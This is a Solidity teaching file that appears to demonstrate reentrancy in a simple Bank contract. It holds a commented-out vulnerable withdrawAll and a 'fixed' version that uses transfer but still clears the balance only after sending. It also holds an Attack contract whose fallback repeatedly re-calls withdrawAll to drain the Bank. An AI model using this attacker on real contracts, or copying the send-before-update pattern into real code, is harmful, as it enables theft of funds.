pragma solidity ^0.4.10;

// contract Bank {

//     mapping(address => uint) balances;

//     function deposit() public payable {
//         balances[msg.sender] = balances[msg.sender] + msg.value;
//     }

//     function withdrawAll() public {
//         uint amount = balances[msg.sender];
//         assert(msg.sender.call.value(amount)());
//         balances[msg.sender] = 0;
//     }
    
//     function getBalance(address _address) public returns(uint) {
//         return(balances[_address]);
//     }

// }

// fixed code
contract Bank {

    mapping(address => uint) balances;

    function deposit() public payable {
        balances[msg.sender] = balances[msg.sender] + msg.value;
    }

    function withdrawAll() public {
        uint amount = balances[msg.sender];
        msg.sender.transfer(amount);
        balances[msg.sender] = 0;
    }
    
    function getBalance(address _address) public returns(uint) {
        return(balances[_address]);
    }

}

contract Attack {

  Bank attacked;
  uint public count;


  function Attack(address victim) public{
    attacked = Bank(victim);
  }

  function() public payable {
    count++;
    if(count < 20) attacked.withdrawAll();
  }
  
  function deposit() public payable{
  }

  function transfer() public{
    attacked.deposit.value(address(this).balance)();
  }
  
  function attack() public{
    count++;
    if(count < 20) attacked.withdrawAll();
  } 
  
  function getBalance() public returns(uint) {
        return(this.balance);
    }

}

